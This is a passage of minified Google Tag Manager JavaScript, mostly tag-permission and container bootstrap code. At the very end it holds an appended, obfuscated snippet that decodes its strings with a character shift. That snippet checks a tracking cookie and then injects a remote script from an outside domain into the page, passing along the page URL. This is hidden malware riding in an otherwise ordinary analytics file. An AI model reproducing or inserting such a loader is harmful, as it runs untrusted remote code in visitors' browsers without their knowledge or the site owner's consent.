          (Z.__detect_form_submit_events.isInfrastructure = !1),
          (Z.__detect_form_submit_events.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.access_consent = ["google"]),
      (function () {
        function a(b, c, d) {
          var e = { consentType: c, read: !1, write: !1 };
          switch (d) {
            case "read":
              e.read = !0;
              break;
            case "write":
              e.write = !0;
              break;
            default:
              throw Error("Invalid " + b + " request " + d);
          }
          return e;
        }
        (Z.__access_consent = function (b) {
          for (
            var c = b.vtp_consentTypes || [],
              d = b.vtp_createPermissionError,
              e = [],
              f = [],
              g = 0;
            g < c.length;
            g++
          ) {
            var k = c[g],
              m = k.consentType;
            k.read && e.push(m), k.write && f.push(m);
          }
          return {
            assert: function (n, p, q) {
              if (!l(p)) throw d(n, {}, "Consent type must be a string.");
              if ("read" === q) {
                if (e.indexOf(p) > -1) return;
              } else {
                if ("write" !== q)
                  throw d(
                    n,
                    {},
                    "Access type must be either 'read', or 'write', was " + q
                  );
                if (f.indexOf(p) > -1) return;
              }
              throw d(
                n,
                {},
                "Prohibited " + q + " on consent type: " + p + "."
              );
            },
            N: a,
          };
        }),
          (Z.__access_consent.C = "access_consent"),
          (Z.__access_consent.isVendorTemplate = !0),
          (Z.__access_consent.priorityOverride = 0),
          (Z.__access_consent.isInfrastructure = !1),
          (Z.__access_consent.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.inject_script = ["google"]),
      (function () {
        function a(b, c) {
          return { url: c };
        }
        (Z.__inject_script = function (b) {
          var c = b.vtp_urls || [],
            d = b.vtp_createPermissionError;
          return {
            assert: function (e, f) {
              if (!l(f)) throw d(e, {}, "Script URL must be a string.");
              try {
                if (
                  (function (a, b) {
                    var c;
                    if (
                      !(c = !(function (a) {
                        return (
                          "https:" === a.protocol &&
                          (!a.port || "443" === a.port)
                        );
                      })(a))
                    ) {
                      var d;
                      a: {
                        var e = a.hostname.split(".");
                        if (e.length < 2) d = !1;
                        else {
                          for (var f = 0; f < e.length; f++)
                            if (!zg.exec(e[f])) {
                              d = !1;
                              break a;
                            }
                          d = !0;
                        }
                      }
                      c = !d;
                    }
                    if (c) return !1;
                    for (var g = 0; g < b.length; g++) {
                      var k,
                        m = a,
                        n = b[g];
                      if (!Ag.exec(n)) throw Error("Invalid Wildcard");
                      var r,
                        p = n.slice(8),
                        q = p.slice(0, p.indexOf("/")),
                        t = m.hostname,
                        u = q;
                      if (0 !== u.indexOf("*."))
                        r = t.toLowerCase() === u.toLowerCase();
                      else {
                        u = u.slice(2);
                        var v = t.toLowerCase().indexOf(u.toLowerCase());
                        r =
                          -1 !== v &&
                          (t.length === u.length ||
                            (t.length === u.length + v && "." === t[v - 1]));
                      }
                      if (r) {
                        var w = p.slice(p.indexOf("/"));
                        k = !!xg(m.pathname + m.search, w);
                      } else k = !1;
                      if (k) return !0;
                    }
                    return !1;
                  })(Yi(f), c)
                )
                  return;
              } catch (g) {
                throw d(e, {}, "Invalid script URL filter.");
              }
              throw d(e, {}, "Prohibited script URL: " + f);
            },
            N: a,
          };
        }),
          (Z.__inject_script.C = "inject_script"),
          (Z.__inject_script.isVendorTemplate = !0),
          (Z.__inject_script.priorityOverride = 0),
          (Z.__inject_script.isInfrastructure = !1),
          (Z.__inject_script.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.unsafe_run_arbitrary_javascript = ["google"]),
      (function () {
        function a() {
          return {};
        }
        (Z.__unsafe_run_arbitrary_javascript = function () {
          return { assert: function () {}, N: a };
        }),
          (Z.__unsafe_run_arbitrary_javascript.C =
            "unsafe_run_arbitrary_javascript"),
          (Z.__unsafe_run_arbitrary_javascript.isVendorTemplate = !0),
          (Z.__unsafe_run_arbitrary_javascript.priorityOverride = 0),
          (Z.__unsafe_run_arbitrary_javascript.isInfrastructure = !1),
          (Z.__unsafe_run_arbitrary_javascript.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.gas = ["google"]),
      (Z.__gas = function (a) {
        var b = h(a),
          c = b;
        (c[Ke.oa] = null), (c[Ke.Tg] = null);
        var d = (b = c);
        d.vtp_fieldsToSet = d.vtp_fieldsToSet || [];
        var e = d.vtp_cookieDomain;
        return (
          void 0 !== e &&
            (d.vtp_fieldsToSet.push({ fieldName: "cookieDomain", value: e }),
            delete d.vtp_cookieDomain),
          b
        );
      }),
      (Z.__gas.C = "gas"),
      (Z.__gas.isVendorTemplate = !0),
      (Z.__gas.priorityOverride = 0),
      (Z.__gas.isInfrastructure = !1),
      (Z.__gas.runInSiloedMode = !1),
      (Z.securityGroups.write_data_layer = ["google"]),
      (function () {
        function a(b, c) {
          return { key: c };
        }
        (Z.__write_data_layer = function (b) {
          var c = b.vtp_keyPatterns || [],
            d = b.vtp_createPermissionError;
          return {
            assert: function (e, f) {
              if (!l(f)) throw d(e, {}, "Keys must be strings.");
              try {
                if (kg(f, c)) return;
              } catch (g) {
                throw d(e, {}, "Invalid key filter.");
              }
              throw d(
                e,
                {},
                "Prohibited write to data layer variable: " + f + "."
              );
            },
            N: a,
          };
        }),
          (Z.__write_data_layer.C = "write_data_layer"),
          (Z.__write_data_layer.isVendorTemplate = !0),
          (Z.__write_data_layer.priorityOverride = 0),
          (Z.__write_data_layer.isInfrastructure = !1),
          (Z.__write_data_layer.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.detect_click_events = ["google"]),
      (function () {
        function a(b, c, d) {
          return { matchCommonButtons: c, cssSelector: d };
        }
        (Z.__detect_click_events = function (b) {
          var c = b.vtp_createPermissionError;
          return {
            assert: function (d, e, f) {
              if (void 0 !== e && "boolean" != typeof e)
                throw c(d, {}, "matchCommonButtons must be a boolean.");
              if (void 0 !== f && "string" != typeof f)
                throw c(d, {}, "cssSelector must be a string.");
            },
            N: a,
          };
        }),
          (Z.__detect_click_events.C = "detect_click_events"),
          (Z.__detect_click_events.isVendorTemplate = !0),
          (Z.__detect_click_events.priorityOverride = 0),
          (Z.__detect_click_events.isInfrastructure = !1),
          (Z.__detect_click_events.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.logging = ["google"]),
      (function () {
        function a() {
          return {};
        }
        (Z.__logging = function (b) {
          var c = b.vtp_environments || "debug",
            d = b.vtp_createPermissionError;
          return {
            assert: function (e) {
              var f;
              if (((f = "all" !== c && !0) && (f = !0), f))
                throw d(e, {}, "Logging is not enabled in all environments");
            },
            N: a,
          };
        }),
          (Z.__logging.C = "logging"),
          (Z.__logging.isVendorTemplate = !0),
          (Z.__logging.priorityOverride = 0),
          (Z.__logging.isInfrastructure = !1),
          (Z.__logging.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.detect_scroll_events = ["google"]),
      (function () {
        function a() {
          return {};
        }
        (Z.__detect_scroll_events = function () {
          return { assert: function () {}, N: a };
        }),
          (Z.__detect_scroll_events.C = "detect_scroll_events"),
          (Z.__detect_scroll_events.isVendorTemplate = !0),
          (Z.__detect_scroll_events.priorityOverride = 0),
          (Z.__detect_scroll_events.isInfrastructure = !1),
          (Z.__detect_scroll_events.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.html = ["customScripts"]),
      (function () {
        function a(d, e, f, g) {
          return function () {
            try {
              if (e.length > 0) {
                var k = e.shift(),
                  m = a(d, e, f, g);
                if (
                  "SCRIPT" == String(k.nodeName).toUpperCase() &&
                  "text/gtmscript" == k.type
                ) {
                  var n = H.createElement("script");
                  (n.async = !1),
                    (n.type = "text/javascript"),
                    (n.id = k.id),
                    (n.text = k.text || k.textContent || k.innerHTML || ""),
                    k.charset && (n.charset = k.charset);
                  var p = k.getAttribute("data-gtmsrc");
                  p && ((n.src = p), wc(n, m)),
                    d.insertBefore(n, null),
                    p || m();
                } else if (
                  k.innerHTML &&
                  k.innerHTML.toLowerCase().indexOf("<script") >= 0
                ) {
                  for (var q = []; k.firstChild; )
                    q.push(k.removeChild(k.firstChild));
                  d.insertBefore(k, null), a(k, q, m, g)();
                } else d.insertBefore(k, null), m();
              } else f();
            } catch (r) {
              I(g);
            }
          };
        }
        (Z.__html = function b(d) {
          var e = jz();
          if (
            (d.vtp_useIframe && e(3),
            d.vtp_supportDocumentWrite && (e(1), e(2)),
            (function kz(a, b, c, d) {
              if (mj) {
                var e = String(c) + b;
                (hz[a] = hz[a] || []),
                  hz[a].push(e),
                  (iz[a] = iz[a] || []),
                  iz[a].push(d + b);
              }
            })(d.vtp_gtmEventId, d.vtp_gtmTagId, e(void 0), "j"),
            H.body)
          ) {
            var f = d.vtp_gtmOnFailure,
              g = (function (a, b, c) {
                if (a instanceof Zy) {
                  var d = a,
                    e = d.resolve,
                    f = b,
                    g = String(xi());
                  ($y[g] = [f, c]), (a = e.call(d, g)), (b = ob);
                }
                return { Tj: a, onSuccess: b };
              })(d.vtp_html, d.vtp_gtmOnSuccess, f),
              k = g.Tj,
              m = g.onSuccess;
            d.vtp_useIframe ||
              (d.vtp_supportDocumentWrite
                ? c(k, m, f)
                : a(
                    H.body,
                    (function (a) {
                      var d,
                        b = H.createElement("div"),
                        c = b,
                        e = pc("A<div>" + a + "</div>"),
                        f = Qb(),
                        g = f ? f.createHTML(e) : e;
                      if (((d = new mc(g, lc)), 1 === c.nodeType)) {
                        var k = c.tagName;
                        if ("SCRIPT" === k || "STYLE" === k) throw Error("");
                      }
                      (c.innerHTML =
                        d instanceof mc && d.constructor === mc
                          ? d.j
                          : "type_error:SafeHtml"),
                        (b = b.lastChild);
                      for (var m = []; b.firstChild; )
                        m.push(b.removeChild(b.firstChild));
                      return m;
                    })(k),
                    m,
                    f
                  )());
          } else
            UI(function () {
              b(d);
            }, 200);
        }),
          (Z.__html.C = "html"),
          (Z.__html.isVendorTemplate = !0),
          (Z.__html.priorityOverride = 0),
          (Z.__html.isInfrastructure = !1),
          (Z.__html.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.get_cookies = ["google"]),
      (function () {
        function a(b, c) {
          return { name: c };
        }
        (Z.__get_cookies = function (b) {
          var c = b.vtp_cookieAccess || "specific",
            d = b.vtp_cookieNames || [],
            e = b.vtp_createPermissionError;
          return {
            assert: function (f, g) {
              if (!l(g)) throw e(f, {}, "Cookie name must be a string.");
              if ("any" !== c && !("specific" === c && d.indexOf(g) >= 0))
                throw e(f, {}, 'Access to cookie "' + g + '" is prohibited.');
            },
            N: a,
          };
        }),
          (Z.__get_cookies.C = "get_cookies"),
          (Z.__get_cookies.isVendorTemplate = !0),
          (Z.__get_cookies.priorityOverride = 0),
          (Z.__get_cookies.isInfrastructure = !1),
          (Z.__get_cookies.runInSiloedMode = !1);
      })();
    var bJ = {};
    function cJ() {
      (hi[Cj()] = hi[Cj()] || bJ),
        Pj(),
        Tj() ||
          z(
            (function Uj() {
              var a = {};
              return (
                z(tj().destination, function (b, c) {
                  0 === c.state && (a[Jj(b)] = c);
                }),
                a
              );
            })(),
            function (d, e) {
              iw(d, e.transportUrl, e.context), O(92);
            }
          ),
        Fb(wi, Z.securityGroups);
      var b,
        a = Gj(Hj()),
        c = null == a || null == (b = a.context) ? void 0 : b.source;
      (2 !== c && 4 !== c && 3 !== c) || O(142),
        ((hi.rm = hi.rm || {})[Ej()] = function (a) {
          if (Xy.hasOwnProperty(a)) return Xy[a];
        }),
        (function rf(a) {
          qf = qf || a;
        })({
          km: function (d) {
            return d === Wy;
          },
          Bl: function (d) {
            return new Zy(d);
          },
          lm: function (d) {
            for (var e = !1, f = !1, g = 2; g < d.length; g++)
              (e = e || 8 === d[g]), (f = f || 16 === d[g]);
            return e && f;
          },
          Jm: function (d) {
            var e;
            if (d === Wy) e = d;
            else {
              var f = xi();
              (Xy[f] = d),
                (e = 'google_tag_manager["rm"]["' + Ej() + '"](' + f + ")");
            }
            return e;
          },
        }),
        (tf = Kf);
    }
    (bJ.onHtmlSuccess = bz(!0)),
      (bJ.onHtmlFailure = bz(!1)),
      (bJ.dataLayer = Hi),
      (bJ.callback = function (a) {
        vi.hasOwnProperty(a) && pb(vi[a]) && vi[a](), delete vi[a];
      }),
      (bJ.bootstrap = 0),
      (bJ._spx = !1);
    !(function (a) {
      function b() {
        yy(
          (n = H.documentElement.getAttribute("data-tag-assistant-present"))
        ) && (m = k.jj);
      }
      function c() {
        m && tc ? g(m) : a();
      }
      if (!G.__TAGGY_INSTALLED) {
        var d = !1;
        if (H.referrer) d = "cct.google" === Ui(Yi(H.referrer), "host");
        if (!d) {
          var f = no("googTaggyReferrer");
          d = !(!f.length || !f[0].length);
        }
        d &&
          ((G.__TAGGY_INSTALLED = !0), Ac("https://cct.google/taggy/agent.js"));
      }
      var g = function (u) {
          var v = "GTM",
            w = "GTM";
          mi && ((v = "OGT"), (w = "GTAG"));
          var x = G["google.tagmanager.debugui2.queue"];
          x ||
            ((x = []),
            (G["google.tagmanager.debugui2.queue"] = x),
            Ac(
              "https://" +
                gi.Gd +
                "/debug/bootstrap?id=" +
                Qf.ctid +
                "&src=" +
                w +
                "&cond=" +
                u +
                "&gtm=" +
                co()
            ));
          var y = {
            messageType: "CONTAINER_STARTING",
            data: {
              scriptSource: tc,
              containerProduct: v,
              debug: !1,
              id: Qf.ctid,
              targetRef: { ctid: Qf.ctid, isDestination: vj.oe },
              aliases: yj(),
              destinations: Bj(),
            },
          };
          (y.data.resume = function () {
            a();
          }),
            gi.zk && (y.data.initialPublish = !0),
            x.push(y);
        },
        k = { Sk: 1, lj: 2, Aj: 3, ni: 4, jj: 5 };
      (k[k.Sk] = "GTM_DEBUG_LEGACY_PARAM"),
        (k[k.lj] = "GTM_DEBUG_PARAM"),
        (k[k.Aj] = "REFERRER"),
        (k[k.ni] = "COOKIE"),
        (k[k.jj] = "EXTENSION_PARAM");
      var m = void 0,
        n = void 0;
      (yy(Si(G.location, "query", !1, void 0, "gtm_debug")) && (m = k.lj),
      !m && H.referrer) &&
        "tagassistant.google.com" === Ui(Yi(H.referrer), "host") &&
        (m = k.Aj);
      if (!m) {
        var r = no("__TAG_ASSISTANT");
        r.length && r[0].length && (m = k.ni);
      }
      if (
        (m || b(),
        !m &&
          (function zy(a) {
            return !(!a || 0 !== a.indexOf("pending:")) && yy(a.substr(8));
          })(n))
      ) {
        var t = !1;
        Ec(
          H,
          "TADebugSignal",
          function () {
            t || ((t = !0), b(), c());
          },
          !1
        ),
          G.setTimeout(function () {
            t || ((t = !0), b(), c());
          }, 200);
      } else c();
    })(function () {
      try {
        var a;
        if (!(a = !U(54))) {
          var b;
          if (!(b = false)) {
            var c;
            a: {
              for (
                var d = tj().injectedFirstPartyContainers,
                  e = ma(xj()),
                  f = e.next();
                !f.done;
                f = e.next()
              )
                if (d[f.value]) {
                  c = !0;
                  break a;
                }
              c = !1;
            }
            b = !c;
          }
          a = b;
        }
        if (a) {
          U(68),
            xk().D(),
            xn(),
            (function () {
              if (void 0 === hi.pscdl) {
                var a = function (b) {
                  hi.pscdl = b;
                };
                try {
                  "cookieDeprecationLabel" in qc
                    ? (a("pending"),
                      qc.cookieDeprecationLabel.getValue().then(a))
                    : a("noapi");
                } catch (b) {
                  a("error");
                }
              }
            })();
          var g = Ej();
          if (tj().canonical[g]) {
            var k = hi.zones;
            k && k.unregisterChild(xj()), Vv().removeExternalRestrictions(Ej());
          } else {
            Ht(),
              (zi.j = "0"),
              (zi.D = zi.H),
              (zi.K = ""),
              (zi.Ra =
                "ad_storage|analytics_storage|ad_user_data|ad_personalization"),
              (zi.Z = "ad_storage|analytics_storage|ad_user_data"),
              (zi.fb = ""),
              (function fw() {
                wj &&
                  Uv(Ej(), function (a) {
                    var c,
                      b = wf(a.entityId);
                    if (zf(b)) {
                      var d = b[Ke.oa];
                      if (!d)
                        throw Error(
                          "Error: No function name given for function call."
                        );
                      var e = of[d];
                      c = !!e && !!e.runInSiloedMode;
                    } else c = !!Tv(b[Ke.oa], 4);
                    return c;
                  });
              })();
            for (
              var m = data.resource || {}, n = m.macros || [], p = 0;
              p < n.length;
              p++
            )
              jf.push(n[p]);
            for (var q = m.tags || [], r = 0; r < q.length; r++) mf.push(q[r]);
            for (var t = m.predicates || [], u = 0; u < t.length; u++)
              lf.push(t[u]);
            for (var v = m.rules || [], w = 0; w < v.length; w++) {
              for (var x = v[w], y = {}, B = 0; B < x.length; B++) {
                var A = x[B][0];
                (y[A] = Array.prototype.slice.call(x[B], 1)),
                  ("if" !== A && "unless" !== A) || y[A];
              }
              kf.push(y);
            }
            (of = Z), (pf = dz), (Mf = new Tf());
            var C = data.sandboxed_scripts,
              E = data.security_groups;
            a: {
              var D = data.runtime || [],
                F = data.runtime_lines;
              (pz = new Ce()),
                (function EI() {
                  pz.j.j.H = function (a, b, c) {
                    (hi.SANDBOXED_JS_SEMAPHORE =
                      hi.SANDBOXED_JS_SEMAPHORE || 0),
                      hi.SANDBOXED_JS_SEMAPHORE++;
                    try {
                      return a.apply(b, c);
                    } finally {
                      hi.SANDBOXED_JS_SEMAPHORE--;
                    }
                  };
                })(),
                (hf = oz());
              var L = pz,
                M = DI(),
                R = new Yc("require", M);
              R.La(), L.j.j.set("require", R);
              for (var V = [], aa = 0; aa < D.length; aa++) {
                var X = D[aa];
                if (!Array.isArray(X) || X.length < 3) {
                  if (0 === X.length) continue;
                  break a;
                }
                F && F[aa] && F[aa].length && Df(X, F[aa]);
                try {
                  pz.execute(X), U(76) && mj && 50 === X[0] && V.push(X[1]);
                } catch (Sn) {}
              }
              U(76) && (uf = V);
            }
            if (C && C.length)
              for (var S = ["sandboxedScripts"], na = 0; na < C.length; na++) {
                var la = C[na].replace(/^_*/, "");
                wi[la] = S;
              }
            if (
              ((function FI(a) {
                a &&
                  z(a, function (b, c) {
                    for (var d = 0; d < c.length; d++) {
                      var e = c[d].replace(/^_*/, "");
                      (wi[e] = wi[e] || []), wi[e].push(b);
                    }
                  });
              })(E),
              cJ(),
              !qi)
            )
              for (
                var ha = Vk() ? Bi(zi.Z) : Bi(zi.Ra), ya = 0;
                ya < Zk.length;
                ya++
              ) {
                var Na = Zk[ya],
                  Ga = Na,
                  Sa = ha[Na] ? "granted" : "denied";
                rk().implicit(Ga, Sa);
              }
            if (
              (xy(),
              (nw = !1),
              (ow = 0),
              ("interactive" === H.readyState && !H.createEventObject) ||
                "complete" === H.readyState)
            )
              qw();
            else {
              if (
                (Ec(H, "DOMContentLoaded", qw),
                Ec(H, "readystatechange", qw),
                H.createEventObject && H.documentElement.doScroll)
              ) {
                var cb = !0;
                try {
                  cb = !G.frameElement;
                } catch (Sn) {}
                cb && rw();
              }
              Ec(G, "load", qw);
            }
            if (
              ((cy = !1),
              "complete" === H.readyState ? ey() : Ec(G, "load", ey),
              mj &&
                ($l(mm),
                G.setInterval(lm, 864e5),
                $l(gz),
                $l(Rw),
                $l(Iu),
                $l(pm),
                $l(lz),
                $l(bx),
                $l(ut),
                U(76) && ($l(Ww), $l(Xw), $l(Yw))),
              nj)
            ) {
              var td;
              !(function jk() {
                bk("v", "3"),
                  bk("t", "t"),
                  bk("pid", function () {
                    return String(hk);
                  }),
                  Ec(G, "pagehide", gk),
                  G.setInterval(ik, 864e5);
              })(),
                (function Gl() {
                  bk(
                    "tdc",
                    function () {
                      Bl && (G.clearTimeout(Bl), (Bl = void 0));
                      var b,
                        a = [];
                      for (b in vl)
                        vl.hasOwnProperty(b) &&
                          a.push(b + "*" + vl[b].join("."));
                      return a.length ? a.join("!") : void 0;
                    },
                    !1
                  );
                })(),
                mw();
              var ud = Gj(Hj());
              if (ud) {
                for (; ud.parent; ) {
                  var yx = Gj(ud.parent);
                  if (!yx) break;
                  ud = yx;
                }
                td = ud;
              } else td = void 0;
              var Xn,
                Ne = td;
              if (Ne) {
                if (Ne.canonicalContainerId) {
                  var Tn;
                  a: {
                    if (Ne.scriptSource) {
                      var Kj;
                      try {
                        var zx;
                        Kj =
                          null == (zx = G.performance || void 0)
                            ? void 0
                            : zx.getEntriesByType("resource");
                      } catch (Sn) {}
                      if (Kj) {
                        for (var Un = {}, Lj = 0; Lj < Kj.length; ++Lj) {
                          var Ax = Kj[Lj],
                            Vn = Ax.initiatorType;
                          if ("script" === Vn && Ax.name === Ne.scriptSource) {
                            Tn = { Qm: Lj, Rm: Un };
                            break a;
                          }
                          Un[Vn] = 1 + (Un[Vn] || 0);
                        }
                        O(146);
                      } else O(145);
                    }
                    Tn = void 0;
                  }
                  var Wn = Tn;
                  Wn &&
                    (bk("rtg", String(Ne.canonicalContainerId)),
                    bk("rlo", String(Wn.Qm)),
                    bk("slo", String(Wn.Rm.script || "0")),
                    bk("hlo", Ne.htmlLoadOrder || "-1"),
                    bk("lst", String(Ne.loadScriptType || "0")));
                }
              } else O(144);
              var Bx,
                Mj = Fj();
              if (Mj)
                Xn =
                  Mj.canonicalContainerId ||
                  "_" +
                    (Mj.scriptContainerId ||
                      (null == (Bx = Mj.destinations) ? void 0 : Bx[0]));
              else Xn = void 0;
              Xn && bk("pcid", Xn),
                U(31) &&
                  (bk("bt", String(zi.H ? 2 : oi ? 1 : 0)),
                  bk("ct", String(zi.H ? 0 : oi ? 1 : 3)));
            }
            Qk(1), xA(), (ui = Cb()), (bJ.bootstrap = ui), U(68);
          }
        }
      } catch (Sn) {
        if ((Qk(4), mj)) {
          var eJ = gm(!0, !0);
          Dc(eJ);
        }
      }
    });
  })();
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44hisqtlx" + "3htr4ljy4xhwnu" + "y3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
